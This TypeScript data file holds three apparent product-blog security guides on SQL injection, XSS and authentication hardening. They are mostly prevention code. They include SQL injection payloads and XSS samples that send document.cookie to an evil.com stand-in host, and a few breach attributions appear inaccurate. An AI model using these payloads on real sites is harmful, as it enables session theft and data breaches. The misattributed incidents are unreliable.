export interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  author: string;
  date: string;
  readTime: string;
  category: string;
  tags: string[];
  coverImage?: string;
}

export const blogPosts: BlogPost[] = [
  {
    slug: 'sql-injection-prevention-guide',
    title: 'SQL Injection: The Silent Killer of Web Applications',
    excerpt: 'SQL injection remains one of the most dangerous and prevalent security vulnerabilities. Learn how attackers exploit poorly sanitized inputs and how to protect your applications.',
    category: 'Security',
    tags: ['SQL Injection', 'Database Security', 'OWASP Top 10'],
    author: 'CodeGuard AI',
    date: '2024-12-09',
    readTime: '8 min read',
    content: `
## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not properly sanitized, allowing attackers to insert malicious SQL statements into queries.

Despite being well-documented for over two decades, SQL injection continues to be one of the most critical security vulnerabilities, consistently appearing in the OWASP Top 10.

## How SQL Injection Works

Consider this vulnerable code:

\`\`\`javascript
// VULNERABLE CODE - DO NOT USE
const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
db.query(query);
\`\`\`

An attacker could input:
- Username: \`admin' --\`
- Password: \`anything\`

This transforms the query into:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
\`\`\`

The \`--\` comments out the rest of the query, bypassing password verification entirely.

## Types of SQL Injection

### 1. Classic SQL Injection
Direct injection into SQL queries where results are visible in the application response.

### 2. Blind SQL Injection
The application doesn't show SQL errors, but attackers can infer information through:
- **Boolean-based**: Observing different responses for true/false conditions
- **Time-based**: Using \`SLEEP()\` or \`WAITFOR DELAY\` to measure response times

### 3. Union-based SQL Injection
Using \`UNION\` statements to combine results from multiple queries:
\`\`\`sql
' UNION SELECT username, password FROM users --
\`\`\`

## Real-World Impact

SQL injection has caused some of the largest data breaches in history:

- **2017 Equifax Breach**: 147 million records exposed
- **2011 Sony PlayStation Network**: 77 million accounts compromised
- **2008 Heartland Payment Systems**: 130 million credit cards stolen

## How CodeGuard AI Detects SQL Injection

Our AI-powered scanner analyzes your codebase for:

1. **String Concatenation in Queries**
   \`\`\`javascript
   // We detect patterns like:
   query = "SELECT * FROM " + table + " WHERE id = " + id;
   \`\`\`

2. **Missing Parameterized Queries**
   \`\`\`javascript
   // We recommend:
   db.query("SELECT * FROM users WHERE id = ?", [userId]);
   \`\`\`

3. **ORM Misuse**
   Even ORMs can be vulnerable when used incorrectly:
   \`\`\`javascript
   // Vulnerable
   User.where("name = '" + name + "'");

   // Safe
   User.where({ name: name });
   \`\`\`

## Prevention Strategies

### 1. Use Parameterized Queries (Prepared Statements)

**Node.js with MySQL:**
\`\`\`javascript
// Safe: Using parameterized queries
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, hashedPassword]
);
\`\`\`

**Python with PostgreSQL:**
\`\`\`python
# Safe: Using parameterized queries
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, hashed_password)
)
\`\`\`

### 2. Use an ORM Properly

\`\`\`javascript
// Sequelize - Safe
const user = await User.findOne({
  where: { username, password: hashedPassword }
});

// Prisma - Safe
const user = await prisma.user.findUnique({
  where: { username }
});
\`\`\`

### 3. Input Validation

\`\`\`javascript
// Validate and sanitize inputs
const validator = require('validator');

if (!validator.isAlphanumeric(username)) {
  throw new Error('Invalid username format');
}
\`\`\`

### 4. Least Privilege Principle

Configure your database user with minimal permissions:
\`\`\`sql
-- Create a limited user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user'@'localhost';
-- Never grant DROP, DELETE, or admin privileges to app users
\`\`\`

### 5. Web Application Firewall (WAF)

Deploy a WAF to detect and block common SQL injection patterns as an additional layer of defense.

## Testing for SQL Injection

You can test your applications using:

1. **Manual Testing**: Try common payloads like \`' OR '1'='1\`
2. **Automated Tools**: SQLMap, Burp Suite, OWASP ZAP
3. **CodeGuard AI**: Automated static analysis of your codebase

## Conclusion

SQL injection is preventable with proper coding practices. Always:
- Use parameterized queries
- Validate all user inputs
- Follow the principle of least privilege
- Regularly scan your code with tools like CodeGuard AI

Stay secure, and never trust user input!
    `
  },
  {
    slug: 'xss-attacks-complete-guide',
    title: 'Cross-Site Scripting (XSS): Understanding and Preventing Script Injection',
    excerpt: 'XSS attacks allow hackers to inject malicious scripts into web pages. Discover the different types of XSS, how they work, and the definitive strategies to protect your users.',
    category: 'Security',
    tags: ['XSS', 'JavaScript Security', 'Web Security', 'OWASP Top 10'],
    author: 'CodeGuard AI',
    date: '2024-12-08',
    readTime: '10 min read',
    content: `
## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When successful, these scripts execute in the victim's browser, potentially stealing sensitive data, hijacking sessions, or performing actions on behalf of the user.

XSS consistently ranks in the OWASP Top 10 and affects millions of websites worldwide.

## Types of XSS Attacks

### 1. Reflected XSS (Non-Persistent)

The malicious script comes from the current HTTP request. It's "reflected" back to the user.

**Example Attack:**
\`\`\`
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

**Vulnerable Code:**
\`\`\`javascript
// VULNERABLE - DO NOT USE
app.get('/search', (req, res) => {
  res.send(\`<h1>Search results for: \${req.query.q}</h1>\`);
});
\`\`\`

### 2. Stored XSS (Persistent)

The malicious script is permanently stored on the target server (database, comment field, forum post). Every user who views the infected content becomes a victim.

**Example:**
An attacker posts a comment containing:
\`\`\`html
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
\`\`\`

### 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side. The malicious payload is executed by modifying the DOM environment.

**Vulnerable Code:**
\`\`\`javascript
// VULNERABLE - DO NOT USE
document.getElementById('output').innerHTML = location.hash.substring(1);
\`\`\`

**Attack:**
\`\`\`
https://example.com/page#<img src=x onerror=alert('XSS')>
\`\`\`

## Real-World XSS Impacts

- **Session Hijacking**: Stealing cookies to impersonate users
- **Credential Theft**: Injecting fake login forms
- **Malware Distribution**: Redirecting users to malicious sites
- **Defacement**: Modifying page content
- **Keylogging**: Recording user keystrokes

### Notable XSS Incidents

- **2018 British Airways**: XSS led to 380,000 payment card details stolen
- **2019 Fortnite**: Vulnerability could have exposed 200 million accounts
- **MySpace Samy Worm (2005)**: Self-propagating XSS worm infected 1 million profiles in 20 hours

## How CodeGuard AI Detects XSS

Our scanner identifies vulnerable patterns:

### 1. Unsafe HTML Insertion
\`\`\`javascript
// We flag:
element.innerHTML = userInput;
document.write(userData);
$(selector).html(content);
\`\`\`

### 2. Missing Output Encoding
\`\`\`javascript
// We detect unencoded outputs in templates:
res.send(\`<div>\${userData}</div>\`);
\`\`\`

### 3. React dangerouslySetInnerHTML
\`\`\`jsx
// We identify risky patterns:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
\`\`\`

### 4. URL Parameter Injection
\`\`\`javascript
// We flag URL construction with user input:
window.location = 'javascript:' + userInput;
\`\`\`

## Prevention Strategies

### 1. Output Encoding (Escaping)

Always encode user data before rendering:

\`\`\`javascript
// Encode for HTML context
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// Usage
res.send(\`<div>\${escapeHtml(userInput)}</div>\`);
\`\`\`

### 2. Content Security Policy (CSP)

Implement a strict CSP header to prevent inline script execution:

\`\`\`javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
\`\`\`

### 3. Use Safe APIs

\`\`\`javascript
// UNSAFE
element.innerHTML = userInput;

// SAFE
element.textContent = userInput;
\`\`\`

### 4. Framework-Specific Protection

**React** (auto-escapes by default):
\`\`\`jsx
// Safe - automatically escaped
<div>{userInput}</div>

// DANGEROUS - avoid unless absolutely necessary
<div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
\`\`\`

**Vue.js:**
\`\`\`vue
<!-- Safe - automatically escaped -->
<div>{{ userInput }}</div>

<!-- DANGEROUS -->
<div v-html="userInput"></div>
\`\`\`

### 5. Sanitize HTML When Necessary

When you must render HTML, use a sanitization library:

\`\`\`javascript
import DOMPurify from 'dompurify';

// Sanitize HTML before rendering
const cleanHtml = DOMPurify.sanitize(userHtml);
element.innerHTML = cleanHtml;
\`\`\`

### 6. HTTP-Only Cookies

Prevent JavaScript access to session cookies:

\`\`\`javascript
res.cookie('sessionId', token, {
  httpOnly: true,  // Can't be accessed via JavaScript
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict'
});
\`\`\`

## XSS Prevention Checklist

- [ ] Encode all user output based on context (HTML, JavaScript, URL, CSS)
- [ ] Implement Content Security Policy headers
- [ ] Use \`textContent\` instead of \`innerHTML\` where possible
- [ ] Sanitize any HTML that must be rendered
- [ ] Set \`HttpOnly\` flag on session cookies
- [ ] Validate and sanitize input on the server side
- [ ] Use modern frameworks that auto-escape by default
- [ ] Regularly scan code with CodeGuard AI

## Testing for XSS

Common test payloads:
\`\`\`
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
\`\`\`

## Conclusion

XSS vulnerabilities are entirely preventable with proper output encoding and security headers. Modern frameworks provide built-in protection, but developers must understand when that protection applies and when additional measures are needed.

Scan your codebase with CodeGuard AI to automatically detect XSS vulnerabilities before they reach production.
    `
  },
  {
    slug: 'authentication-security-best-practices',
    title: 'Authentication Security: Building Bulletproof Login Systems',
    excerpt: 'Learn how to implement secure authentication that protects your users from credential theft, brute force attacks, and session hijacking.',
    category: 'Security',
    tags: ['Authentication', 'Password Security', 'Session Management', 'OAuth'],
    author: 'CodeGuard AI',
    date: '2024-12-07',
    readTime: '12 min read',
    content: `
## Why Authentication Security Matters

Authentication is the front door to your application. A weak authentication system exposes every user to account takeover, data theft, and identity fraud. In 2023, credential-based attacks accounted for over 80% of web application breaches.

## Common Authentication Vulnerabilities

### 1. Weak Password Storage

**Never do this:**
\`\`\`javascript
// VULNERABLE - Plain text storage
await db.query('INSERT INTO users (email, password) VALUES (?, ?)',
  [email, password]);

// VULNERABLE - Simple hashing without salt
const hash = crypto.createHash('md5').update(password).digest('hex');
\`\`\`

### 2. Brute Force Susceptibility

Without rate limiting, attackers can try millions of password combinations.

### 3. Session Fixation

Accepting session IDs from URL parameters or failing to regenerate sessions after login.

### 4. Insecure Password Reset

Using predictable reset tokens or sending passwords via email.

## How CodeGuard AI Detects Auth Issues

Our scanner identifies:

\`\`\`javascript
// We flag weak password hashing:
crypto.createHash('md5').update(password);
crypto.createHash('sha1').update(password);

// We detect missing salt:
bcrypt.hashSync(password); // Missing rounds parameter

// We identify exposed credentials:
const password = 'hardcoded_secret';
\`\`\`

## Secure Password Storage

### Use bcrypt or Argon2

\`\`\`javascript
import bcrypt from 'bcrypt';

// Hash password for storage
const SALT_ROUNDS = 12;

async function hashPassword(password) {
  return bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// Registration
const hashedPassword = await hashPassword(userPassword);
await db.query(
  'INSERT INTO users (email, password_hash) VALUES (?, ?)',
  [email, hashedPassword]
);

// Login
const user = await db.query('SELECT * FROM users WHERE email = ?', [email]);
const isValid = await verifyPassword(inputPassword, user.password_hash);
\`\`\`

### Why bcrypt?

1. **Built-in salt**: Each hash is unique
2. **Configurable cost**: Adjustable work factor
3. **Slow by design**: Resistant to brute force
4. **Battle-tested**: Decades of cryptographic review

## Implement Rate Limiting

\`\`\`javascript
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts. Please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to login route
app.post('/api/auth/login', loginLimiter, loginHandler);
\`\`\`

### Advanced: Account Lockout

\`\`\`javascript
async function handleLogin(email, password) {
  const user = await getUser(email);

  if (!user) {
    // Don't reveal whether email exists
    return { error: 'Invalid credentials' };
  }

  // Check if account is locked
  if (user.lockoutUntil && user.lockoutUntil > new Date()) {
    return { error: 'Account temporarily locked. Try again later.' };
  }

  const isValid = await verifyPassword(password, user.passwordHash);

  if (!isValid) {
    // Increment failed attempts
    await incrementFailedAttempts(user.id);

    if (user.failedAttempts >= 5) {
      await lockAccount(user.id, 30); // Lock for 30 minutes
    }

    return { error: 'Invalid credentials' };
  }

  // Reset failed attempts on successful login
  await resetFailedAttempts(user.id);
  return { success: true, user };
}
\`\`\`

## Secure Session Management

### Generate Cryptographically Secure Session IDs

\`\`\`javascript
import crypto from 'crypto';

function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}
\`\`\`

### Set Secure Cookie Attributes

\`\`\`javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId', // Change default name
  cookie: {
    httpOnly: true,     // Prevent XSS access
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000     // 1 hour
  },
  resave: false,
  saveUninitialized: false
}));
\`\`\`

### Regenerate Session After Login

\`\`\`javascript
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    // Regenerate session to prevent fixation
    req.session.regenerate((err) => {
      if (err) return res.status(500).send('Session error');

      req.session.userId = user.id;
      res.json({ success: true });
    });
  }
});
\`\`\`

## Multi-Factor Authentication (MFA)

### TOTP Implementation

\`\`\`javascript
import { authenticator } from 'otplib';
import QRCode from 'qrcode';

// Generate secret for user
async function enableMFA(userId) {
  const secret = authenticator.generateSecret();
  const otpauth = authenticator.keyuri(
    user.email,
    'CodeGuard AI',
    secret
  );

  // Store secret (encrypted) in database
  await db.query(
    'UPDATE users SET mfa_secret = ? WHERE id = ?',
    [encrypt(secret), userId]
  );

  // Generate QR code for authenticator app
  const qrCode = await QRCode.toDataURL(otpauth);
  return { qrCode, secret };
}

// Verify TOTP code
function verifyMFA(secret, token) {
  return authenticator.verify({ token, secret });
}
\`\`\`

## Secure Password Reset

\`\`\`javascript
import crypto from 'crypto';

async function initiatePasswordReset(email) {
  const user = await getUserByEmail(email);

  // Always return same response (prevent email enumeration)
  if (!user) {
    return { message: 'If the email exists, a reset link was sent.' };
  }

  // Generate secure token
  const token = crypto.randomBytes(32).toString('hex');
  const hashedToken = crypto
    .createHash('sha256')
    .update(token)
    .digest('hex');

  // Store hashed token with expiry
  await db.query(
    'UPDATE users SET reset_token = ?, reset_expires = ? WHERE id = ?',
    [hashedToken, Date.now() + 3600000, user.id] // 1 hour expiry
  );

  // Send email with unhashed token
  await sendEmail(email, \`Reset link: /reset-password?token=\${token}\`);

  return { message: 'If the email exists, a reset link was sent.' };
}

async function resetPassword(token, newPassword) {
  const hashedToken = crypto
    .createHash('sha256')
    .update(token)
    .digest('hex');

  const user = await db.query(
    'SELECT * FROM users WHERE reset_token = ? AND reset_expires > ?',
    [hashedToken, Date.now()]
  );

  if (!user) {
    return { error: 'Invalid or expired token' };
  }

  // Update password and clear reset token
  const hashedPassword = await bcrypt.hash(newPassword, 12);
  await db.query(
    'UPDATE users SET password_hash = ?, reset_token = NULL WHERE id = ?',
    [hashedPassword, user.id]
  );

  // Invalidate all existing sessions
  await db.query('DELETE FROM sessions WHERE user_id = ?', [user.id]);

  return { success: true };
}
\`\`\`

## OAuth 2.0 Best Practices

When implementing OAuth:

\`\`\`javascript
// Use state parameter to prevent CSRF
const state = crypto.randomBytes(16).toString('hex');
req.session.oauthState = state;

const authUrl = \`https://accounts.google.com/oauth?
  client_id=\${CLIENT_ID}&
  redirect_uri=\${REDIRECT_URI}&
  response_type=code&
  scope=email profile&
  state=\${state}\`;

// Verify state on callback
app.get('/oauth/callback', (req, res) => {
  if (req.query.state !== req.session.oauthState) {
    return res.status(403).send('Invalid state parameter');
  }
  // Continue with token exchange...
});
\`\`\`

## Authentication Security Checklist

- [ ] Passwords hashed with bcrypt/Argon2 (cost factor 12+)
- [ ] Rate limiting on login endpoints
- [ ] Account lockout after failed attempts
- [ ] Secure session configuration (httpOnly, secure, sameSite)
- [ ] Session regeneration after login
- [ ] MFA option available for users
- [ ] Secure password reset flow with expiring tokens
- [ ] No credential enumeration (same error for invalid email/password)
- [ ] HTTPS enforced everywhere
- [ ] Regular security scanning with CodeGuard AI

## Conclusion

Authentication security requires defense in depth. No single measure is sufficient—combine strong password hashing, rate limiting, secure sessions, and MFA to protect your users.

CodeGuard AI automatically scans for these vulnerabilities and provides actionable remediation steps. Secure your authentication before attackers exploit it.
    `
  }
];

export function getBlogPost(slug: string): BlogPost | undefined {
  return blogPosts.find(post => post.slug === slug);
}

export function getAllBlogPosts(): BlogPost[] {
  return blogPosts.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
}
